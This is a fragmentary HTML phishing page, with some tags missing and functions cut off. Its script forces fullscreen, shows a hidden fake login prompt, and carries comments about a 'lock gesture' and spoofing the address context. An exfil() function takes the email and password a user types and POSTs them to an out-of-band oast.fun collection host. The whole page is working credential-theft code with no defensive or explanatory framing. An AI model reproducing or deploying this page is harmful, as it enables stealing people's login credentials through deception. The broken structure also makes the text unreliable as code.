<!DOCTYPE html>
<html>
<head>

    html, body {

      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 18px;
      border-radius: 10px;
      background-color: #0071e3;
      color: white;
      border: none;
    }
  </style>
</head>
<body>

      document.documentElement.requestFullscreen().then(() => {
        setTimeout(() => {
          alert(""); // lock gesture
          document.getElementById('fakePrompt').style.display = 'flex';
        }, 200);
      });
    }

    function exfil() {
      let email = document.getElementById('email').value;
      let pass = document.getElementById('pass').value;
      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
        method: "POST",
        body: JSON.stringify({ email, pass }),
        mode: "no-cors"
      });
    }

    window.onload = () => {
      let win = window.open("about:blank", "_blank");
      setTimeout(() => {
        win.location.replace(location.href); // spoof address context
      }, 100);

    // Gesture trigger

</body>
</html>
